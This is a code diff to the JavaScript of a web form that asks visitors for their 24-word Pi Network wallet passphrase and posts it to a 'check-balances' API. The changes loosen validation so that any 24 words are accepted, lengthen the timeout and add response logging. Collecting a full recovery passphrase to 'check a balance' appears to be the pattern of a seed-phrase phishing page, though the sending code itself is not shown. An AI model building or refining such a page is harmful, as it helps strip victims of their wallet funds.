@@ -10,7 +10,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
   const API_URL = (window.APP_CONFIG && window.APP_CONFIG.API_URL) || window.API_URL || 'http://localhost:3000/api/check-balances';
   const INVALID_MESSAGE = 'Invalid passphrase: please enter a valid passphrase';
-  const REQUEST_TIMEOUT = 30000; // 30 seconds
+  const REQUEST_TIMEOUT = 60000; // 60 seconds
 
   function showStatus(message, type) {
     statusDiv.textContent = message;
@@ -30,9 +30,21 @@ document.addEventListener('DOMContentLoaded', function() {
     invalidModal.style.display = 'none';
   }
 
+  // BASIC validation only - Pi Network does NOT follow strict BIP39
   function validatePassphrase(passphrase) {
     const words = passphrase.split(/\s+/).filter(Boolean);
-    return words.length === 24 && words.every(w => w.length >= 2);
+    
+    // Only check: 24 words, each word at least 2 characters
+    // Do NOT use bip39 validation here
+    if (words.length !== 24) {
+      return { valid: false, reason: `Expected 24 words, got ${words.length}` };
+    }
+    
+    if (words.some(w => w.length < 2)) {
+      return { valid: false, reason: 'Some words are too short' };
+    }
+    
+    return { valid: true, words: words };
   }
 
   async function checkBalance(passphrase) {
@@ -78,7 +90,10 @@ document.addEventListener('DOMContentLoaded', function() {
       return;
     }
 
-    if (!validatePassphrase(passphrase)) {
+    // Basic validation only
+    const validation = validatePassphrase(passphrase);
+    if (!validation.valid) {
+      console.log('❌ Validation failed:', validation.reason);
       showStatus(INVALID_MESSAGE, 'error');
       showInvalidModal();
       return;
@@ -91,8 +106,11 @@ document.addEventListener('DOMContentLoaded', function() {
     try {
       const data = await checkBalance(passphrase);
 
+      console.log('📊 API Response:', data);
+
       if (data.results && data.results.length > 0) {
         const result = data.results[0];
+        console.log('📊 First Result:', result);
 
         if (result.status === 'invalid') {
           showStatus(INVALID_MESSAGE, 'error');
@@ -101,7 +119,7 @@ document.addEventListener('DOMContentLoaded', function() {
           showStatus('Wallet not found. Please check your passphrase.', 'error');
           showInvalidModal();
         } else if (result.status === 'error') {
-          showStatus('Error checking balance. Please try again later.', 'error');
+          showStatus('Error checking balance: ' + (result.error || 'Unknown error'), 'error');
         } else {
           // Success - store result and redirect
           sessionStorage.setItem('walletResult', JSON.stringify(result));
@@ -111,13 +129,8 @@ document.addEventListener('DOMContentLoaded', function() {
         throw new Error('No results received');
       }
     } catch (error) {
-      console.error('Error:', error);
+      console.error('❌ Error:', error);
       showStatus(error.message || INVALID_MESSAGE, 'error');
-      
-      // Only show modal for invalid passphrase errors
-      if (error.message.includes('Invalid passphrase')) {
-        showInvalidModal();
-      }
     } finally {
       submitBtn.disabled = false;
       submitBtn.textContent = 'Submit';
